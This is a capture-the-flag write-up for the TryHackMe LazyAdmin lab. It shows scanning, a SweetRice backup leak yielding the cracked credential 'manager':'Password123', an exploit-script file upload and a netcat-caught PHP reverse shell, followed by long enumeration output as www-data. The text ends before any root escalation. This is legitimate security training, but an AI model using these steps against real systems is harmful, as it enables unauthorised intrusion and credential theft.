# [LazyAdmin](https://tryhackme.com/room/lazyadmin)

> A Linux machine serving [SweetRice](https://www.sweetrice.xyz/) version 1.5.1 on port 80. This version of [SweetRice](https://www.sweetrice.xyz/) contains a [vulnerability that discloses a MySQL backup file](https://www.exploit-db.com/exploits/40718) which contains the credential of a [SweetRice](https://www.sweetrice.xyz/) user. This credential can be used in combination with an [authenticated arbitrary file upload vulnerability](https://www.exploit-db.com/exploits/40716) to upload and execute a PHP reverse shell on the target. This grants access as a low-privilege user who is configured to run a backup Perl script with `root` privileges via `sudo`. This Perl script calls a `bash` script, which is world-writable. By replacing this `bash` script with a malicious one, it is possible to achieve code execution as `root` and fully compromise the target.

---

## Open Port Enumeration

The target's TCP ports 22 (SSH) and 80 (HTTP) are open.

```bash
$ sudo masscan -p1-65535 10.10.28.64 --rate=1000 -e tun0 --output-format grepable --output-filename enum/lazy-admin.masscan
$ cat enum/lazy-admin.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.8), the OpenSSH banner indicates the target's operating system is Ubuntu 16.04 (Xenial).

The target's port 80 appears to be running an Apache web server version 2.4.18 with the default web page.

```bash
$ sudo nmap -sC -sV -O -p22,80 10.10.28.64 -oA enum/lazy-admin
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 16:57 EST
Nmap scan report for 10.10.28.64
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds
```

---

## Web Application Enumeration

Port 80's landing page is the default Apache web page.

![](images/Pasted%20image%2020220122170254.png)

### Content Discovery

The path `/content` seems interesting.

```bash
$ gobuster dir -u http://10.10.28.64 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x html,php -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.28.64
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
2022/01/22 20:10:27 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/content              (Status: 301) [Size: 316] [--> http://10.10.238.238/content/]
/.                    (Status: 200) [Size: 11321]

===============================================================
2022/01/22 20:34:20 Finished
===============================================================
```

### Manual Enumeration

#### `/content`

This is the landing page of an instance of [SweetRice](https://www.sweetrice.xyz/), a content management system.

![](images/Pasted%20image%2020220122170411.png)

[SweetRice](https://www.sweetrice.xyz/) is known to have several vulnerabilities:

---

## SweetRice MySQL Backup Disclosure

[SweetRice](https://www.sweetrice.xyz/) version 1.5.1 contains a [vulnerability that discloses sensitive backup files](https://www.exploit-db.com/exploits/40718). On the target, a MySQL backup file can be found at `/content/inc/mysql_backup/`.

![](images/Pasted%20image%2020220122171828.png)

Downloading the backup file and parsing through it, it appears to contain a blob of data with a credential: the username `manager` and the hash `42f749ade7f9e195bf475f37a44cafcb`.

```bash
...[SNIP]...
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

[CrackStation](https://crackstation.net/) indicates the hash corresponds to the password `Password123`.

![](images/Pasted%20image%2020220122172053.png)

---

## SweetRice Arbitrary File Upload

The credential `manager`:`Password123` can be used to access the [SweetRice](https://www.sweetrice.xyz/) administrative panel at `/content/as`.

![](images/Pasted%20image%2020220122172219.png)

[SweetRice](https://www.sweetrice.xyz/) version 1.5.1 contains an [authenticated arbitrary file upload vulnerability](https://www.exploit-db.com/exploits/40716).

Download the exploit from the above link and execute it as follows:

```bash
$ python3 40716.py

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.28.64/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : tgihf.phtml
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.28.64/content/attachment/tgihf.phtml
```

Start a `netcat` listener:

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Navigate to the specified URL and catch the reverse shell:

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.6.31.77] from (UNKNOWN) [10.10.28.64] 34844
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 00:33:33 up 43 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Situational Awareness as `www-data`

The target's kernel version is 4.15.0 and the operating system is Ubuntu 16.04.

```bash
www-data@THM-Chal:/var/www/html$ uname -a
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux

www-data@THM-Chal:/var/www/html$ cat /etc/issue
Ubuntu 16.04.6 LTS \n \l
```

The CPU is 64-bit (32-bit optional) with one core and one thread on that core.

```bash
www-data@THM-Chal:/var/www/html$ lscpu
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 63
Model name:            Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping:              2
CPU MHz:               2399.994
BogoMIPS:              4800.00
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              30720K
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht nx rdtscp lm constant_tsc xtopology cpuid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault pti fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt
```

No interesting processes.

```bash
www-data@THM-Chal:/var/www/html$ ps auxef
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    Jan22   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        R    Jan22   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    Jan22   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [xenwatch]
root        20  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   Jan22   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [crypto]
root        26  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kintegrityd]
root        27  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kblockd]
root        28  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [ata_sff]
root        29  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [md]
root        30  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [edac-poller]
root        31  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [devfreq_wq]
root        32  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [watchdogd]
root        35  0.0  0.0      0     0 ?        S    Jan22   0:02  \_ [kswapd0]
root        36  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kworker/u17:0]
root        37  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [ecryptfs-kthrea]
root        79  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kthrotld]
root        80  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [acpi_thermal_pm]
root        84  0.0  0.0      0     0 ?        I    Jan22   0:00  \_ [kworker/u16:2]
root        85  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [scsi_eh_0]
root        86  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [scsi_tmf_0]
root        87  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [scsi_eh_1]
root        88  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [scsi_tmf_1]
root        89  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [ipv6_addrconf]
root        90  0.0  0.0      0     0 ?        I    Jan22   0:00  \_ [kworker/u16:3]
root        96  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kworker/0:1H]
root       100  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [charger_manager]
root       166  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [ttm_swap]
root       191  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [jbd2/xvda1-8]
root       192  0.0  0.0      0     0 ?        I<   Jan22   0:00  \_ [ext4-rsv-conver]
root      2089  0.0  0.0      0     0 ?        I    00:00   0:00  \_ [kworker/0:1]
root      2199  0.0  0.0      0     0 ?        I    00:06   0:00  \_ [kworker/0:0]
root         1  0.5  0.8  24000  3816 ?        Ss   Jan22   0:25 /sbin/init splash
root       228  0.0  0.5   5108  2372 ?        Ss   Jan22   0:03 /lib/systemd/systemd-journald
root       259  0.0  0.6  14916  2828 ?        Ss   Jan22   0:02 /lib/systemd/systemd-udevd
avahi      678  0.0  0.5   5924  2240 ?        Ss   Jan22   0:00 avahi-daemon: running [THM-Chal.local]
avahi      700  0.0  0.0   5924    56 ?        S    Jan22   0:00  \_ avahi-daemon: chroot helper
syslog     679  0.0  0.4  30732  2128 ?        Ssl  Jan22   0:01 /usr/sbin/rsyslogd -n
root       680  0.0  0.2   2248  1040 ?        Ss   Jan22   0:00 /usr/sbin/acpid
root       685  0.0  0.8  39212  3700 ?        Ssl  Jan22   0:00 /usr/lib/accountsservice/accounts-daemon
root       690  0.0  0.5   4136  2408 ?        Ss   Jan22   0:00 /lib/systemd/systemd-logind
message+   698  0.0  0.8   6388  3464 ?        Ss   Jan22   0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       725  0.0  0.4   6016  2052 ?        Ss   Jan22   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -
root       737  0.0  1.0  83640  4760 ?        Ssl  Jan22   0:01 /usr/sbin/NetworkManager --no-daemon
root       740  0.0  0.4   7116  2008 ?        Ss   Jan22   0:00 /usr/sbin/cron -f
root       905  0.0  1.2  37152  5292 ?        Ssl  Jan22   0:01 /usr/lib/policykit-1/polkitd --no-debug
root       937  0.0  1.1  36196  5184 ?        Ssl  Jan22   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-sign
mysql      952  0.1 21.8 546980 94432 ?        Ssl  Jan22   0:04 /usr/sbin/mysqld
root       956  0.0  0.9  10004  4296 ?        Ss   Jan22   0:00 /usr/sbin/sshd -D
whoopsie   974  0.0  0.9  38176  3928 ?        Ssl  Jan22   0:00 /usr/bin/whoopsie -f
root      1062  0.0  4.5 152228 19656 ?        Ss   Jan22   0:00 /usr/sbin/apache2 -k start
www-data  1567  0.0  3.7 152852 16392 ?        S    Jan22   0:00  \_ /usr/sbin/apache2 -k start
www-data  1569  0.0  3.8 152852 16632 ?        S    Jan22   0:00  \_ /usr/sbin/apache2 -k start
www-data  1570  0.0  3.8 152852 16512 ?        S    Jan22   0:00  \_ /usr/sbin/apache2 -k start
www-data  1571  0.0  3.6 152916 15840 ?        S    Jan22   0:00  \_ /usr/sbin/apache2 -k start
www-data  2043  0.0  3.8 152916 16648 ?        S    Jan22   0:01  \_ /usr/sbin/apache2 -k start
www-data  2179  0.0  3.6 152852 15928 ?        S    00:02   0:00  \_ /usr/sbin/apache2 -k start
www-data  2181  0.0  3.9 152972 16956 ?        S    00:02   0:01  \_ /usr/sbin/apache2 -k start
www-data  2184  0.0  3.8 152924 16684 ?        S    00:02   0:00  \_ /usr/sbin/apache2 -k start
www-data  2442  0.0  0.1   2372   652 ?        S    00:56   0:00  |   \_ sh -c uname -a; w; id; /bin/sh -i APACHE_RUN_DIR=/var/run/apache2 APACHE_PID_FILE=/
www-data  2446  0.0  0.1   2372   652 ?        S    00:56   0:00  |       \_ /bin/sh -i APACHE_RUN_DIR=/var/run/apache2 APACHE_PID_FILE=/var/run/apache2/apa
www-data  2447  0.0  1.5   9640  6908 ?        S    00:56   0:00  |           \_ python3 -c import pty; pty.spawn("/bin/bash") APACHE_RUN_DIR=/var/run/apach
www-data  2448  0.0  0.6   3784  2964 pts/9    Ss   00:56   0:00  |               \_ /bin/bash APACHE_RUN_DIR=/var/run/apache2 APACHE_PID_FILE=/var/run/apac
www-data  2457  0.0  0.6   5824  2884 pts/9    R+   00:59   0:00  |                   \_ ps auxef APACHE_PID_FILE=/var/run/apache2/apache2.pid TERM=screen A
www-data  2189  0.0  3.6 152916 15844 ?        S    00:03   0:00  \_ /usr/sbin/apache2 -k start
www-data  2272  0.0  3.8 152916 16608 ?        S    00:16   0:00  \_ /usr/sbin/apache2 -k start
root      1089  0.0  3.9 152964 17056 ?        Ss   Jan22   0:01 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data  1110  0.0  1.2 152964  5484 ?        S    Jan22   0:00  \_ php-fpm: pool www
www-data  1111  0.0  1.2 152964  5484 ?        S    Jan22   0:00  \_ php-fpm: pool www
root      1250  0.0  0.8  35196  3848 ?        Ssl  Jan22   0:00 /usr/sbin/lightdm
root      1262  0.0  4.6 153212 20208 tty7     Ssl+ Jan22   0:02  \_ /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt
root      1281  0.0  0.9  27908  4028 ?        Sl   Jan22   0:00  \_ lightdm --session-child 16 19
lightdm   1292  0.0  0.1   2372   516 ?        Ss   Jan22   0:00  |   \_ /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter
lightdm   1298  0.2  4.2 370540 18472 ?        Sl   Jan22   0:09  |       \_ /usr/sbin/unity-greeter
root      1333  0.0  0.7   9372  3396 ?        S    Jan22   0:00  \_ lightdm --session-child 12 19
root      1258  0.0  0.3   6104  1448 ttyS0    Ss+  Jan22   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1259  0.0  0.3   4752  1396 tty1     Ss+  Jan22   0:00 /sbin/agetty --noclear tty1 linux
lightdm   1284  0.0  0.5   6396  2584 ?        Ss   Jan22   0:00 /lib/systemd/systemd --user
lightdm   1285  0.0  0.2  25016   928 ?        S    Jan22   0:00  \_ (sd-pam)
lightdm   1297  0.0  0.5   6160  2536 ?        Ss   Jan22   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
lightdm   1300  0.0  0.7  43468  3424 ?        Sl   Jan22   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately
lightdm   1305  0.0  0.6   5940  2600 ?        S    Jan22   0:00  \_ /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-add
lightdm   1307  0.0  0.5  29176  2320 ?        Sl   Jan22   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
lightdm   1313  0.0  0.7  39796  3332 ?        Sl   Jan22   0:00 /usr/lib/gvfs/gvfsd
lightdm   1318  0.0  0.6  50688  2960 ?        Sl   Jan22   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/108/gvfs -f -o big_writes
lightdm   1328  0.0  0.7  25268  3156 ?        Sl   Jan22   0:00 /usr/lib/dconf/dconf-service
lightdm   1336  0.0  0.7   9684  3288 ?        S    Jan22   0:00 upstart --user --startup-event indicator-services-start
lightdm   1340  0.0  0.9  48060  4148 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
lightdm   1341  0.0  0.6  53816  3008 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
lightdm   1342  0.0  0.8  72700  3804 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
lightdm   1343  0.0  1.3  92080  5856 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
lightdm   1344  0.1  2.1 105280  9456 ?        Ssl  Jan22   0:04  \_ /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
lightdm   1345  0.0  0.9 323552  4168 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
lightdm   1346  0.0  0.7  70944  3076 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
lightdm   1361  0.0  1.2  58000  5516 ?        Ssl  Jan22   0:00  \_ /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
lightdm   1395  0.0  0.7 156548  3376 ?        S<l  Jan22   0:00  \_ /usr/bin/pulseaudio --start --log-target=syslog
lightdm   1338  0.0  2.3 111680 10220 ?        Sl   Jan22   0:02 nm-applet
lightdm   1375  0.0  2.1  82828  9116 ?        Sl   Jan22   0:02 /usr/lib/unity-settings-daemon/unity-settings-daemon
rtkit     1396  0.0  0.6  23792  2700 ?        SNsl Jan22   0:00 /usr/lib/rtkit/rtkit-daemon
root      1418  0.0  0.9  72992  4248 ?        Ssl  Jan22   0:00 /usr/lib/upower/upowerd
colord    1427  0.0  1.3  43224  5968 ?        Ssl  Jan22   0:01 /usr/lib/colord/colord
root      1598  0.0  1.0  15728  4496 ?        Ss   Jan22   0:00 /usr/sbin/cupsd -l
root      1599  0.0  1.2  37444  5216 ?        Ssl  Jan22   0:00 /usr/sbin/cups-browsed
```

```bash
www-data@THM-Chal:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The current user is capable of executing `/usr/bin/perl /home/itguy/backup.pl`as `root`.

```bash
www-data@THM-Chal:/var/www/html$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

There is no useful execution history.

```bash
www-data@THM-Chal:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
itguy:x:1000:1000:THM-Chal,,,:/home/itguy:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
guest-3myc2b:x:998:998:Guest:/tmp/guest-3myc2b:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```

```bash
www-data@THM-Chal:/var/www/html$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,itguy
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:itguy
floppy:x:25:
tape:x:26:
sudo:x:27:itguy
audio:x:29:pulse
dip:x:30:itguy
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:itguy
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:
messagebus:x:110:
uuidd:x:111:
ssl-cert:x:112:
lpadmin:x:113:itguy
lightdm:x:114:
nopasswdlogin:x:115:
ssh:x:116:
whoopsie:x:117:
mlocate:x:118:
avahi-autoipd:x:119:
avahi:x:120:
bluetooth:x:121:
scanner:x:122:saned
colord:x:123:
pulse:x:124:
pulse-access:x:125:
rtkit:x:126:
saned:x:127:
itguy:x:1000:
sambashare:x:128:itguy
mysql:x:129:
vboxsf:x:999:
guest-3myc2b:x:998:
```

```bash
www-data@THM-Chal:/var/www/html$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:da:9f:63:e3:7b
          inet addr:10.10.28.64  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::da:9fff:fe63:e37b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:272589 errors:0 dropped:0 overruns:0 frame:0
          TX packets:202761 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:25410628 (25.4 MB)  TX bytes:69213442 (69.2 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:108 errors:0 dropped:0 overruns:0 frame:0
          TX packets:108 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:10786 (10.7 KB)  TX bytes:10786 (10.7 KB)
```

```bash
www-data@THM-Chal:/var/www/html$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0
link-local      *               255.255.0.0     U     1000   0        0 eth0
```

```bash
www-data@THM-Chal:/var/www/html$ arp -a
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0
```

```bash
www-data@THM-Chal:/var/www/html$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      2 10.10.28.64:34850       10.6.31.77:443          ESTABLISHED on (0.31/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
